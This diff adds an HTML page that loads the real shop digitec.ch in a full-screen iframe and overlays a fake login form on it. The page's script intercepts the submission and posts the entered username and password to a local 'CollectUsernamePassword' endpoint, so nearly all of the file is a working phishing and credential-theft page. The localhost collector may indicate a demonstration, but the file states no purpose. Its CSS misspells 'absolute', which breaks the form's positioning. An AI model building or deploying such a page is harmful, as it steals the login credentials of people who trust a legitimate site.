@@ -1,0 +1,46 @@
+<!doctype html>
+<html class="no-js" lang="">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="x-ua-compatible" content="ie=edge">
+    </head>
+
+    <style>
+        body {width:100%; height:1000px; padding:0px;margin:0px;}
+        .iframe {width:100%; height:100%; padding:0px;margin:0px;position:absoulte;border:none;}
+        #myform {position:absoulte;top:0px;right:300px;}
+    </style>
+
+    <body>
+
+        <iframe src="https://digitec.ch" class="iframe" />
+
+        <form id="myform" action="" method="POST" accept-charset="utf-8">
+           <input type="text" name="username" id="username" />
+           <input type="password" name="password" id="password" />
+           <input type="submit" name="submit" value="log in" />
+        </form>
+
+        <script type="text/javascript">
+            document.getElementById("myform").addEventListener("submit", function (e) {
+               e.preventDefault();
+               e.stopPropagation();
+
+               if(e.target && e.target.id == 'myform')
+               {
+                    var xmlhttp = new XMLHttpRequest();
+
+                    var username = document.getElementById("username").value;
+                    var password = document.getElementById("password").value;
+
+                    console.log(username, password);
+
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('POST', 'http://localhost:49670/API/CollectUsernamePassword');
+                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                    xhr.send('username=' + username + '&password=' + password);
+               }
+            });
+        </script>
+    </body>
+</html>
